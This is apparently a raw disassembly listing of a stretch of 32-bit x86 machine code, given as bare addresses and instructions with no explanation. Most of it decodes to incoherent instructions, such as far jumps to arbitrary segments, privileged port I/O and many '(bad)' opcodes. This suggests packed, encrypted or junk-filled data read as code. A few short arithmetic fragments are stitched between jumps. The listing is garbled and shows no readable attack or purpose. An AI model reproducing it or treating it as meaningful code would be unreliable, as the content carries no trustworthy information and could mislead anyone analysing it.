  41163d:	xlat   BYTE PTR ds:[ebx]
  41163e:	mov    dl,dl
  411640:	jmp    0xb2e1:0x72bdb2f5
  411647:	add    al,0xaf
  411649:	push   edi
  41164a:	sar    DWORD PTR [ebp-0x2563a7e2],1
  411650:	mov    ebp,0xa57f1e68
  411655:	xchg   ebp,eax
  411656:	mov    ecx,DWORD PTR [esi+0x56]
  411659:	xor    bh,BYTE PTR [ebx-0x7c6ba4af]
  41165f:	das    
  411660:	pop    ebx
  411661:	sub    ah,al
  411663:	das    
  411664:	pop    ds
  411665:	jmp    0x4116bd
  411667:	mov    edi,DWORD PTR cs:[esi+ecx*2-0x63]
  41166c:	aam    0x70
  41166e:	cmp    BYTE PTR [edx+0x6c],cl
  411671:	cmp    bh,ah
  411673:	xchg   ebx,eax
  411674:	add    edi,DWORD PTR [eax-0x58c8e03f]
  41167a:	sub    esi,ebx
  41167c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41167d:	xor    BYTE PTR [eax+0x2df33abe],0xa3
  411684:	clc    
  411685:	lods   eax,DWORD PTR ds:[esi]
  411686:	stos   BYTE PTR es:[edi],al
  411687:	inc    esi
  411688:	pop    es
  411689:	xor    eax,0x94a976a7
  41168e:	fimul  DWORD PTR [edx+ecx*4]
  411691:	in     eax,dx
  411692:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411693:	xchg   ebx,eax
  411694:	jg     0x4116c3
  411696:	jmp    0xb9cb8442
  41169b:	aas    
  41169c:	int    0xc0
  41169e:	into   
  41169f:	hlt    
  4116a0:	xchg   ecx,eax
  4116a1:	jne    0x4116fa
  4116a3:	popa   
  4116a4:	fs push 0x51
  4116a7:	sub    esp,ebp
  4116a9:	push   ebp
  4116aa:	outs   dx,DWORD PTR ds:[esi]
  4116ab:	stos   DWORD PTR es:[edi],eax
  4116ac:	mov    ?,WORD PTR [esi+eiz*1+0x239d8c0e]
  4116b3:	dec    esp
  4116b4:	dec    ebp
  4116b5:	mov    esi,0xca87d15d
  4116ba:	adc    dh,BYTE PTR [ebp+0x65]
  4116bd:	push   ebx
  4116be:	test   al,0x23
  4116c0:	sbb    al,0x3b
  4116c2:	repnz loopne 0x41171d
  4116c5:	(bad)  
  4116c6:	cmp    BYTE PTR ds:0x14b574f2,bh
  4116cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116cd:	int3   
  4116ce:	aad    0x5c
  4116d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116d1:	and    BYTE PTR ds:[eax-0x1efc653c],dl
  4116d8:	and    eax,0xf7270d34
  4116dd:	jo     0x41171b
  4116df:	std    
  4116e0:	push   0xa825574
  4116e5:	jl     0x411695
  4116e7:	cwde   
  4116e8:	mov    ebx,fs
  4116ea:	push   eax
  4116eb:	sti    
  4116ec:	sub    DWORD PTR [edi+edi*1+0x4f],0x63
  4116f1:	jecxz  0x4116b4
  4116f3:	lods   al,BYTE PTR ds:[esi]
  4116f4:	lock sbb ebx,DWORD PTR [eax+ebx*8-0x80]
  4116f9:	neg    DWORD PTR [ebp+0x320f6169]
  4116ff:	push   esi
  411700:	int    0x41
  411702:	sbb    al,0xf6
  411704:	dec    esi
  411705:	xlat   BYTE PTR ds:[ebx]
  411706:	int    0x67
  411708:	pop    esi
  411709:	sub    BYTE PTR ds:0xf56340ac,bl
  41170f:	sbb    ecx,DWORD PTR [ebx]
  411711:	add    eax,0x2a9880bc
  411716:	addr16 push 0xc74a35ff
  41171c:	mov    eax,0x2b468019
  411721:	fist   DWORD PTR [ebp+0x4c]
  411724:	out    dx,eax
  411725:	fisubr WORD PTR [esi+0x70]
  411728:	jmp    0x8de514f
  41172d:	int3   
  41172e:	jmp    0x489c8560
  411733:	(bad)  
  411734:	rol    ebx,0x9d
  411737:	fisttp DWORD PTR [eax+esi*8+0x1a]
  41173b:	xchg   ebp,eax
  41173c:	(bad)  
  41173d:	loope  0x4117a9
  41173f:	in     eax,dx
  411740:	iret   
  411741:	push   eax
  411742:	rcr    DWORD PTR [edi],1
  411744:	inc    eax
  411745:	fild   QWORD PTR [esi]
  411747:	xchg   esi,eax
  411748:	ror    edi,0xf6
  41174b:	out    0x48,al
  41174d:	pop    ebp
  41174e:	loope  0x4116e9
  411750:	test   al,0xd2
  411752:	cli    
  411753:	ret    0xe2a2
  411756:	mov    ds:0xc38ac2cb,al
  41175b:	mov    bh,0x69
  41175d:	gs cdq 
  41175f:	add    BYTE PTR [ebx+eax*2+0x6eb51c42],dl
  411766:	cwde   
  411767:	mov    ch,0xf4
  411769:	cmp    cl,BYTE PTR [ebx]
  41176b:	adc    eax,0x1cb78b7e
  411770:	fwait
  411771:	add    edi,DWORD PTR ds:0xf2b588e5
  411777:	jne    0x4117f5
  411779:	test   DWORD PTR [eax+esi*1+0x26],eax
  41177d:	jle    0x411756
  41177f:	push   cs
  411780:	es inc esp
  411782:	xor    eax,0x8b50236c
  411787:	push   ebp
  411788:	shr    cl,1
  41178a:	call   0x8b411796
  41178f:	push   ebp
  411790:	enter  0x7d8b,0xfc
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	(bad)  
  4117b4:	jmp    0x62654ba8
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	test   BYTE PTR [eax-0x556e1bf0],bh
  4117c5:	pop    ss
  4117c6:	loopne 0x411748
  4117c8:	sub    ebp,edi
  4117ca:	nop
  4117cb:	out    dx,eax
  4117cc:	and    eax,0xcb9a5059
  4117d1:	aam    0xc9
  4117d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117d4:	add    DWORD PTR [ebp+0x616c45ea],0x2e
  4117db:	pusha  
  4117dc:	jb     0x4117c5
  4117de:	ud1    ebx,esi
  4117e1:	ds pop es
  4117e3:	popf   
  4117e4:	data16 jp 0x4117a0
  4117e7:	cmp    dh,BYTE PTR [edi+0x66]
  4117ea:	xchg   DWORD PTR [eax-0x3216e8dd],ebx
  4117f0:	popa   
  4117f1:	imul   ebx,DWORD PTR [ebx],0xffffffd9
  4117f4:	(bad)  
  4117f5:	mov    es,WORD PTR [ecx+0x104502e6]
  4117fb:	xchg   DWORD PTR [esi-0x15f68641],edx
  411801:	fwait
  411802:	cmc    
  411803:	mov    dl,0xeb
  411805:	sub    cl,BYTE PTR [ecx-0x151ab422]
  41180b:	jge    0x411857
  41180d:	push   es
  41180e:	sbb    eax,0x1fd8419a
  411813:	ret    0xda06
  411816:	cmp    dh,BYTE PTR [eax+0xb]
  411819:	hlt    
  41181a:	push   ss
  41181b:	ins    DWORD PTR es:[edi],dx
  41181c:	cmc    
  41181d:	adc    edx,DWORD PTR [edi]
  41181f:	hlt    
  411820:	xchg   esi,eax
  411821:	sub    BYTE PTR [ecx-0x3c78531a],dh
  411827:	outs   dx,BYTE PTR ds:[esi]
  411828:	pop    ebx
  411829:	mov    bl,0xe1
  41182b:	aad    0xcf
  41182d:	loop   0x4118a8
  41182f:	cmp    bl,BYTE PTR [esi+0x4eb16a26]
  411835:	dec    ecx
  411836:	and    eax,0x4415885c
  41183b:	xor    eax,0x7c8a419a
  411840:	call   0x4da1f568
  411845:	push   ebp
  411846:	or     al,BYTE PTR [esi-0x7f]
  411849:	adc    cl,BYTE PTR [ecx-0x7a]
  41184c:	pop    edi
  41184d:	lods   al,BYTE PTR ds:[esi]
  41184e:	mov    cl,BYTE PTR [eax-0xc1c57b9]
  411854:	ror    DWORD PTR [eax-0x7af1dd44],1
  41185a:	xchg   ecx,eax
  41185b:	push   eax
  41185c:	push   cs
  41185d:	loopne 0x4118db
  41185f:	mul    DWORD PTR [edx]
  411861:	pop    ecx
  411862:	lock ret 
  411864:	(bad)  
  411865:	loop   0x411817
  411867:	pop    edi
  411868:	adc    DWORD PTR [ebp-0x7e],edx
  41186b:	pop    edi
  41186c:	js     0x4117f2
  41186e:	(bad)  
  41186f:	fbld   TBYTE PTR [esi-0x5ed3953e]
  411875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411876:	lahf   
  411877:	add    dh,bh
  411879:	loopne 0x41188c
  41187b:	out    dx,al
  41187c:	in     al,dx
  41187d:	mov    al,ds:0xe1834af7
  411882:	inc    ecx
  411883:	xchg   ebx,eax
  411884:	push   0x31461a5d
  411889:	addr16 ds dec ebx
  41188c:	jmp    0xc9ec:0x77ea4730
  411893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411894:	out    dx,eax
  411895:	jecxz  0x411866
  411897:	or     ebx,DWORD PTR [edi+0x6]
  41189a:	push   0xffffffc1
  41189c:	pop    ds
  41189d:	dec    ecx
  41189e:	iret   
  41189f:	fimul  WORD PTR [edi+0x54803b5c]
  4118a5:	mov    edi,0xbe51c388
  4118aa:	fist   WORD PTR [ebx]
  4118ac:	loopne 0x4118ec
  4118ae:	xchg   edi,eax
  4118af:	mul    eax
  4118b1:	inc    esi
  4118b2:	js     0x411846
  4118b4:	sbb    DWORD PTR [ecx],eax
  4118b6:	out    dx,al
  4118b7:	retf   
  4118b8:	push   eax
  4118b9:	sub    eax,DWORD PTR [eax-0x5f57fad0]
  4118bf:	push   ss
  4118c0:	sub    ah,bh
  4118c2:	xlat   BYTE PTR ds:[ebx]
  4118c3:	jne    0x41187e
  4118c5:	(bad)
  4118c9:	out    dx,al
  4118ca:	mov    ecx,0x8ed35719
  4118cf:	cmp    eax,0x49c22627
  4118d4:	inc    ebx
  4118d5:	xlat   BYTE PTR ds:[ebx]
  4118d6:	mov    ds:0x7b115f88,eax
  4118db:	mov    ecx,0x6da86302
  4118e0:	aas    
  4118e1:	test   DWORD PTR fs:[eax],0xd892e6d0
  4118e8:	out    0xbb,al
  4118ea:	mov    bl,0x88
  4118ec:	jb     0x41196c
  4118ee:	ins    DWORD PTR es:[edi],dx
  4118ef:	jo     0x4118ce
  4118f1:	test   eax,0x87c1a20a
  4118f6:	or     DWORD PTR [ebp+0xb],eax
  4118f9:	dec    ebp
  4118fa:	(bad)  
  4118fb:	test   eax,0xbffa419f
  411900:	mov    ax,0x2f99
  411904:	fucomp st(4)
  411906:	and    BYTE PTR [ebp-0x19],al
  411909:	jmp    0x904344d1
  41190e:	pop    esi
  41190f:	jg     0x411947
  411911:	std    
  411912:	dec    edi
  411913:	jmp    0x4118e9
  411915:	inc    DWORD PTR [eax-0x4ea340ee]
  41191b:	jb     0x4118a5
  41191d:	xlat   BYTE PTR ds:[ebx]
  41191e:	mov    ecx,0xf39f6f59
  411923:	(bad)
  411926:	sbb    eax,0x60ef1807
  41192b:	popa   
  41192c:	push   edx
  41192d:	sub    eax,0x9a32a006
  411932:	xor    eax,0xb72f6dfb
  411937:	test   eax,0x90c17cb
  41193c:	(bad)  
  41193d:	out    0x26,al
  41193f:	push   esi
  411940:	scas   al,BYTE PTR es:[edi]
  411941:	xchg   ebx,eax
  411942:	or     DWORD PTR [edi+0x15],0xffffff82
  411946:	test   BYTE PTR [esi+edi*1+0x71a63398],bl
  41194d:	xchg   ebx,eax
  41194e:	mov    eax,0xf40b6930
  411953:	push   0x5e
  411955:	cmp    al,0xf3
  411957:	mov    edi,0xbf8c6eda
  41195c:	sbb    BYTE PTR [ecx+0x40],cl
  41195f:	sub    DWORD PTR [eax+0x18],eax
  411962:	adc    DWORD PTR [ecx+eax*2],0x409d959c
  411969:	rcl    DWORD PTR [ebx],cl
  41196b:	add    eax,0x488777e8
  411970:	inc    ecx
  411971:	pop    edx
  411972:	in     al,0x68
  411974:	mov    bl,0xf1
  411976:	push   0xffffff9e
  411978:	int    0xba
  41197a:	in     eax,0x10
  41197c:	div    DWORD PTR [edi+0x5a8d9a11]
  411982:	imul   BYTE PTR [bp+si+0x7628]
  411987:	jno    0x41196f
  411989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41198a:	neg    BYTE PTR [edi-0x29]
  41198d:	xchg   ecx,eax
  41198e:	push   cs
  41198f:	retfw  
  411991:	cli    
  411992:	mov    ds:0x824232be,eax
  411997:	inc    edx
  411998:	gs mov ecx,0x18921576
  41199e:	aam    0x3e
  4119a0:	and    BYTE PTR [edx-0x6dba0e15],bh
  4119a6:	jno    0x411a01
  4119a8:	xor    dh,dh
  4119aa:	into   
  4119ab:	cmp    BYTE PTR [edi],bh
  4119ad:	inc    esp
  4119ae:	and    al,0x5e
  4119b0:	adc    eax,0xd56a6dc8
  4119b5:	cmp    cl,BYTE PTR [esi]
  4119b7:	arpl   WORD PTR [esi+0x4eefd664],di
  4119bd:	jle    0x411a16
  4119bf:	(bad)  
  4119c0:	frstor [ebx]
  4119c2:	mov    edi,0x133192d1
  4119c7:	(bad)  
  4119c8:	scas   eax,DWORD PTR es:[edi]
  4119c9:	je     0x4119d8
  4119cb:	mov    esp,0x1953d7e4
  4119d0:	shr    DWORD PTR [edi-0x1a8473c3],1
  4119d6:	xor    eax,0xeac47f58
  4119db:	sub    al,al
  4119dd:	cmp    DWORD PTR [edx-0x1f749e],0xfccc9126
  4119e7:	lods   eax,DWORD PTR ds:[esi]
  4119e8:	push   esp
  4119e9:	cmp    DWORD PTR [eax-0x6f4ba2a1],ecx
  4119ef:	(bad)  
  4119f0:	dec    ebx
  4119f1:	ja     0x411981
  4119f3:	push   cs
  4119f4:	retf   0x4ff3
  4119f7:	js     0x4119d2
  4119f9:	in     al,dx
  4119fa:	outs   dx,BYTE PTR ds:[esi]
  4119fb:	fisttp QWORD PTR [ecx-0x347c35af]
  411a01:	sub    bh,dl
  411a03:	inc    edi
  411a04:	aas    
  411a05:	pop    esp
  411a06:	xchg   ecx,eax
  411a07:	popa   
  411a08:	enter  0xcbc9,0x43
  411a0c:	clc    
  411a0d:	sbb    DWORD PTR [esi+0x7dea61a0],eax
  411a13:	pop    ebp
  411a14:	xlat   BYTE PTR ds:[ebx]
  411a15:	in     eax,dx
  411a16:	adc    eax,0x1340268e
  411a1b:	sub    edx,ebp
  411a1d:	sub    eax,0x7e56ed7d
  411a22:	xlat   BYTE PTR ds:[ebx]
  411a23:	fist   DWORD PTR [edi+esi*2]
  411a26:	xchg   ecx,eax
  411a27:	cwde   
  411a28:	into   
  411a29:	fimul  DWORD PTR [ebx-0x20d40fa3]
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0x4fd7da8b
  411a62:	sub    ah,BYTE PTR [edi+0x6]
  411a65:	xchg   ecx,eax
  411a66:	pusha  
  411a67:	js     0x411ae1
  411a69:	in     eax,0x7e
  411a6b:	js     0x411ae5
  411a6d:	outs   dx,BYTE PTR ds:[esi]
  411a6e:	mov    ch,0x9d
  411a70:	or     al,0x10
  411a72:	cmp    dh,BYTE PTR [edi+0x74]
  411a75:	push   ds
  411a76:	fist   WORD PTR [ebp+edi*2+0xde9721c]
  411a7d:	(bad)  
  411a7e:	in     eax,dx
  411a7f:	fsub   DWORD PTR [edx+0x7bbc4142]
  411a85:	sbb    al,0x4d
  411a87:	ins    DWORD PTR es:[edi],dx
  411a88:	mov    ebp,0x5e66ed6c
  411a8d:	nop
  411a8e:	dec    ebx
  411a8f:	sti    
  411a90:	enter  0x4159,0xc7
  411a94:	mov    ds:0xf3f64222,eax
  411a99:	add    al,0xad
  411a9b:	inc    ebx
  411a9c:	(bad)  
  411a9e:	sahf   
  411a9f:	push   edi
  411aa0:	jns    0x411a22
  411aa2:	jmp    DWORD PTR [eax]
  411aa4:	dec    ecx
  411aa5:	inc    ebx
  411aa6:	mov    ebp,0x9cb0da21
  411aab:	sbb    dl,BYTE PTR [ebx-0x1]
  411aae:	cmp    BYTE PTR [ebp+0x41],cl
  411ab1:	push   edx
  411ab2:	pop    esp
  411ab3:	cmp    dh,BYTE PTR [ecx+0x7876c4c2]
  411ab9:	pop    ds
  411aba:	mov    eax,ds:0x32cc55bd
  411abf:	push   ebp
  411ac0:	loop   0x411aa8
  411ac2:	mov    eax,ds:0xfb137544
  411ac7:	inc    eax
  411ac8:	inc    esi
  411ac9:	pusha  
  411aca:	xor    al,0xd6
  411acc:	sub    ah,BYTE PTR [ebx-0x30401b58]
  411ad2:	mov    DWORD PTR [ebx],edi
  411ad4:	(bad)  
  411ad5:	ret    
  411ad6:	cmp    al,0x5f
  411ad8:	retf   0x5fd5
  411adb:	xchg   BYTE PTR [edx+edi*4+0x64],ch
  411adf:	mov    dl,0xc1
  411ae1:	rol    esp,0xee
  411ae4:	inc    ebx
  411ae5:	inc    bp
  411ae7:	clc    
  411ae8:	jmp    0x411a95
  411aea:	mov    ah,0x4a
  411aec:	ja     0x411ab2
  411aee:	push   edx
  411aef:	scas   eax,DWORD PTR es:[edi]
  411af0:	pop    esi
  411af1:	aas    
  411af2:	ret    
  411af3:	imul   esp,esp,0x15f6ebf5
  411af9:	inc    eax
  411afa:	sub    bh,BYTE PTR [eax-0x2e7783f6]
  411b00:	pop    ss
  411b01:	xchg   esp,eax
  411b02:	xor    DWORD PTR [esp+edx*4-0x739a326a],eax
  411b09:	loop   0x411b69
  411b0b:	jecxz  0x411acd
  411b0d:	stos   BYTE PTR es:[edi],al
  411b0e:	and    DWORD PTR [edi],ebx
  411b10:	loopne 0x411ad4
  411b12:	sub    edi,edx
  411b14:	out    0xd8,eax
  411b16:	xor    eax,0xc194035
  411b1b:	inc    ecx
  411b1c:	in     al,0xbc
  411b1e:	xor    ebx,DWORD PTR [ebp+0xa]
  411b21:	call   0xd16:0xa77ed363
  411b28:	test   al,0x6c
  411b2a:	or     ebp,DWORD PTR [ecx+eiz*2+0x8]
  411b2e:	inc    eax
  411b2f:	pop    edi
  411b30:	cmp    eax,ebp
  411b32:	pop    ebx
  411b33:	loop   0x411b51
  411b35:	(bad)  
  411b36:	fild   DWORD PTR [ebx+0x24]
  411b39:	pop    edx
  411b3a:	jno    0x411ba9
  411b3c:	ss mov esi,0xa4b2b667
  411b42:	push   ds
  411b43:	lahf   
  411b44:	pop    esi
  411b45:	shl    cl,0x62
  411b48:	cmp    BYTE PTR [ebp+0x17993402],0xb8
  411b4f:	xor    eax,0xe2ca0a98
  411b54:	sbb    DWORD PTR [ebx+esi*1],ebx
  411b57:	cmp    al,0x28
  411b59:	mov    ecx,0x2345db0c
  411b5e:	lds    edx,FWORD PTR [edi]
  411b60:	jno    0x411bca
  411b62:	pop    edi
  411b63:	cmp    dl,BYTE PTR [esp+edx*4-0x9ddbfda]
  411b6a:	je     0x411be4
  411b6c:	pop    ebx
  411b6d:	call   0x2d53:0xc87493d1
  411b74:	sub    dh,ch
  411b76:	rol    DWORD PTR [edi+0x58],1
  411b79:	outs   dx,BYTE PTR ds:[esi]
  411b7a:	retf   0xe524
  411b7d:	in     eax,dx
  411b7e:	add    al,0xe0
  411b80:	sub    al,0xe8
  411b82:	pop    ss
  411b83:	jg     0x411b63
  411b85:	rcl    BYTE PTR [ebx],1
  411b87:	jl     0x411b91
  411b89:	gs stos BYTE PTR es:[edi],al
  411b8b:	adc    al,0xaf
  411b8d:	dec    esp
  411b8e:	xlat   BYTE PTR ds:[ebx]
  411b8f:	sbb    ecx,DWORD PTR [di]
  411b92:	xchg   ebp,eax
  411b93:	add    ebx,edx
  411b95:	mov    ebx,0xb912086c
  411b9a:	jae    0x411b95
  411b9c:	pop    ebx
  411b9d:	(bad)  
  411b9e:	adc    al,0x55
  411ba0:	fsub   st,st(1)
  411ba2:	dec    ebx
  411ba3:	sbb    BYTE PTR [esi+0x76],bh
  411ba6:	(bad)  
  411ba7:	mov    eax,0x744822c1
  411bac:	in     eax,dx
  411bad:	inc    ecx
  411bae:	sub    DWORD PTR [edi],edi
  411bb0:	xor    eax,0x17e49841
  411bb5:	pop    ds
  411bb6:	call   0xf843:0x9114e8fa
  411bbd:	and    eax,0x65f1de93
  411bc2:	pop    ds
  411bc3:	sbb    DWORD PTR [edi-0x3d9f7a8b],edi
  411bc9:	outs   dx,BYTE PTR ds:[esi]
  411bca:	mov    dh,0xa2
  411bcc:	clc    
  411bcd:	push   esi
  411bce:	repnz fucomp st(1)
  411bd1:	pop    esi
  411bd2:	jno    0x411c50
  411bd4:	xchg   esi,eax
  411bd5:	scas   al,BYTE PTR es:[edi]
  411bd6:	mov    dl,0xca
  411bd8:	ja     0x411ba9
  411bda:	mov    ?,WORD PTR [edi+0x51]
  411bdd:	aaa    
  411bde:	pop    ss
  411bdf:	jle    0x411b77
  411be1:	xchg   BYTE PTR [ebp-0x4b],ah
  411be4:	pop    ebp
  411be5:	dec    edx
  411be6:	sub    al,0x46
  411be8:	cmp    edx,ecx
  411bea:	inc    eax
  411beb:	out    dx,eax
  411bec:	add    dh,cl
  411bee:	mov    cl,0xc4
  411bf0:	sbb    bl,0x3b
  411bf3:	inc    eax
  411bf4:	nop
  411bf5:	cdq    
  411bf6:	rcl    BYTE PTR [eax],1
  411bf8:	gs retf 
  411bfa:	int3   
  411bfb:	jno    0x411bb6
  411bfd:	out    dx,eax
  411bfe:	mov    ds:0x6037ab8e,al
  411c03:	test   esi,edi
  411c05:	mov    ss,WORD PTR [esp+ebx*2]
  411c08:	sub    al,0xfe
  411c0a:	(bad)  
  411c0c:	fs mov ecx,0x3d14beae
  411c12:	hlt    
  411c13:	xor    BYTE PTR [edx],ah
  411c15:	or     eax,0x2b7ed4bb
  411c1a:	outs   dx,BYTE PTR ds:[esi]
  411c1b:	mov    DWORD PTR [edi-0x52],edx
  411c1e:	push   eax
  411c1f:	ins    DWORD PTR es:[edi],dx
  411c20:	and    BYTE PTR [eax+0x44f82dc5],0x39
  411c27:	in     al,dx
  411c28:	fwait
  411c29:	push   edi
  411c2a:	pop    edx
  411c2b:	fst    st(0)
  411c2d:	cdq    
  411c2e:	pop    edx
  411c2f:	call   0xa3bfecb1
  411c34:	cmc    
  411c35:	dec    esi
  411c36:	test   al,0xb
  411c38:	xor    esi,esi
  411c3a:	les    edx,FWORD PTR [edi+0x32938b7a]
  411c40:	xor    BYTE PTR ds:0x5b351fca,0x5c
  411c48:	add    ebp,DWORD PTR [edx+0x48]
  411c4b:	loope  0x411cad
  411c4d:	mov    bh,0x83
  411c4f:	(bad)  [esi+0x48]
  411c52:	jnp    0x411c2d
  411c54:	xor    ch,BYTE PTR [ebx]
  411c56:	stc    
  411c57:	popf   
  411c58:	es leave 
  411c5a:	mov    DWORD PTR [ebx],ebp
  411c5c:	sbb    al,0xe2
  411c5e:	leave  
  411c5f:	mov    DWORD PTR [ebx],edx
  411c61:	sbb    al,0x6e
  411c63:	lods   al,BYTE PTR ds:[esi]
  411c64:	dec    eax
  411c65:	push   ss
  411c66:	sbb    bl,cl
  411c68:	inc    ebp
  411c69:	iret   
  411c6a:	inc    BYTE PTR [ebx+0x29]
  411c6d:	push   0x47
  411c6f:	jmp    0xab3122b8
  411c74:	(bad)  
  411c75:	(bad)  
  411c76:	or     DWORD PTR [ecx],esp
  411c78:	fsubr  DWORD PTR [ebx-0x16f65ef8]
  411c7e:	dec    ebp
  411c7f:	cld    
  411c80:	fucompp 
  411c82:	pop    edx
  411c83:	pop    ss
  411c84:	ret    
  411c85:	test   eax,0xec5cfaab
  411c8a:	das    
  411c8b:	in     al,0x8
  411c8d:	cmp    edi,ebp
  411c8f:	cmp    DWORD PTR [edx+0x43b0ec2b],edx
  411c95:	fdiv   st(5),st
  411c97:	iret   
  411c98:	jns    0x411c47
  411c9a:	rol    al,1
  411c9c:	jecxz  0x411c39
  411c9e:	mov    esp,esp
  411ca0:	fnstcw WORD PTR [eax+0x74664f04]
  411ca6:	or     eax,DWORD PTR [ecx]
  411ca8:	jne    0x411cd2
  411caa:	test   ebp,edx
  411cac:	cmc    
  411cad:	inc    edi
  411cae:	xchg   DWORD PTR [ecx+ecx*1+0x73],esp
  411cb2:	or     ecx,DWORD PTR [ebx+0x74]
  411cb5:	sbb    BYTE PTR ds:0xa0ecd6f3,cl
  411cbb:	sub    DWORD PTR [eax+0x28],esp
  411cbe:	(bad)  
  411cc0:	dec    esi
  411cc1:	popa   
  411cc2:	lods   al,BYTE PTR ds:[esi]
  411cc3:	mov    ecx,0x9edb340a
  411cc8:	push   eax
  411cc9:	pop    esp
  411cca:	or     esp,DWORD PTR [ebp-0x76]
  411ccd:	mov    DWORD PTR [ebp-0x76],ebx
  411cd0:	call   0x92e7a648
  411cd5:	cdq    
  411cd6:	push   es
  411cd7:	lds    ecx,FWORD PTR [ebx+0x5d8bf87d]
  411cdd:	lock sub ebx,edi
  411ce0:	cmp    ebx,edx
  411ce2:	mov    edx,DWORD PTR [ebp-0x38]
  411ce5:	jbe    0x411f76
  411ceb:	jmp    0x411f73
  411cf0:	rol    al,1
  411cf2:	(bad)  
  411cf3:	ds (bad) 
  411cf5:	into   
  411cf6:	rcl    dh,1
  411cf8:	adc    eax,0x8666579e
  411cfd:	mov    edi,0x657e09b1
  411d02:	js     0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	sbb    ch,ah
  411d0a:	daa    
  411d0b:	out    0x7b,eax
  411d0d:	dec    esi
  411d0e:	xor    DWORD PTR [ebx+0x3d1cafc1],edi
  411d14:	or     BYTE PTR [ecx-0x2f],dh
  411d17:	pop    DWORD PTR [ebx]
  411d19:	xchg   ebp,eax
  411d1a:	or     bl,cl
  411d1c:	mov    bh,0x23
  411d1e:	ret    0x49df
  411d21:	loope  0x411d85
  411d23:	shl    ebp,0x3d
  411d26:	dec    ecx
  411d27:	stos   DWORD PTR es:[edi],eax
  411d28:	hlt    
  411d29:	fwait
  411d2a:	inc    esp
  411d2b:	mov    esi,ecx
  411d2d:	loope  0x411cbe
  411d2f:	mov    WORD PTR [esi-0x55],?
  411d32:	arpl   ax,cx
  411d34:	sbb    DWORD PTR [esi+0x1fcd2f35],edi
  411d3a:	mov    ah,0xd2
  411d3c:	sub    cl,bl
  411d3e:	dec    eax
  411d3f:	scas   al,BYTE PTR es:[edi]
  411d40:	cmp    ch,BYTE PTR [edi-0x7]
  411d43:	into   
  411d44:	cwde   
  411d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d46:	sbb    ah,BYTE PTR [edi+0x42a4a4ec]
  411d4c:	es int3 
  411d4e:	and    edi,ebp
  411d50:	xor    edx,DWORD PTR cs:[ebx]
  411d53:	inc    edx
  411d54:	rcl    DWORD PTR [ebx],0xf9
  411d57:	in     al,dx
  411d58:	clc    
  411d59:	sti    
  411d5a:	rcr    BYTE PTR [eax-0x35],1
  411d5d:	sub    BYTE PTR [esi],dl
  411d5f:	push   ss
  411d60:	test   BYTE PTR [esi-0x71],al
  411d63:	mov    bh,0x7
  411d65:	test   BYTE PTR [edx],dl
  411d67:	sub    bl,BYTE PTR [edx-0x32]
  411d6a:	mov    eax,ds:0x69984987
  411d6f:	and    dh,dh
  411d71:	jge    0x411d4f
  411d73:	jmp    0x411d77
  411d75:	out    dx,eax
  411d76:	cwde   
  411d77:	cld    
  411d78:	push   es
  411d79:	jne    0x411dc9
  411d7b:	(bad)  
  411d7c:	sub    esp,DWORD PTR [edx+0x1b]
  411d7f:	adc    eax,0x43507f08
  411d84:	jg     0x411d64
  411d86:	sbb    dl,al
  411d88:	lods   eax,DWORD PTR ds:[esi]
  411d89:	mov    ecx,0x414d8f71
  411d8e:	push   ss
  411d8f:	dec    edx
  411d90:	xor    eax,0x9ea4db7
  411d95:	pusha  
  411d96:	add    ebx,DWORD PTR [esi+eax*8]
  411d99:	rol    DWORD PTR [ebp-0x678362bd],cl
  411d9f:	in     al,0x89
  411da1:	push   0x50c29017
  411da6:	mov    ch,0x6
  411da8:	pop    ds
  411da9:	mov    bh,0x8a
  411dab:	cli    
  411dac:	(bad)  
  411dad:	mov    dl,0x54
  411daf:	add    cl,al
  411db1:	stc    
  411db2:	aam    0x19
  411db4:	push   ebp
  411db5:	fmul   st(2),st
  411db7:	lods   al,BYTE PTR ds:[esi]
  411db8:	jns    0x411d3a
  411dba:	mov    al,ds:0x67f22e24
  411dbf:	je     0x411e34
  411dc1:	and    ecx,DWORD PTR [edx-0x2c]
  411dc4:	cdq    
  411dc5:	mov    BYTE PTR [edx],dl
  411dc7:	bound  edi,QWORD PTR [ebp+ebp*8+0x30]
  411dcb:	int    0xbe
  411dcd:	jmp    0x411d8d
  411dcf:	stos   BYTE PTR es:[edi],al
  411dd0:	test   al,0x6e
  411dd2:	jne    0x411e42
  411dd4:	movntps XMMWORD PTR [edx-0x52],xmm3
  411dd8:	scas   eax,DWORD PTR es:[edi]
  411dd9:	jae    0x411d5f
  411ddb:	inc    edi
  411ddc:	xchg   DWORD PTR [esp+edx*4],ecx
  411ddf:	lods   al,BYTE PTR ds:[esi]
  411de0:	ret    
  411de1:	cmp    ah,BYTE PTR [ecx-0x55]
  411de4:	xchg   ebp,eax
  411de5:	sub    edx,DWORD PTR [esi]
  411de7:	mov    bh,0x46
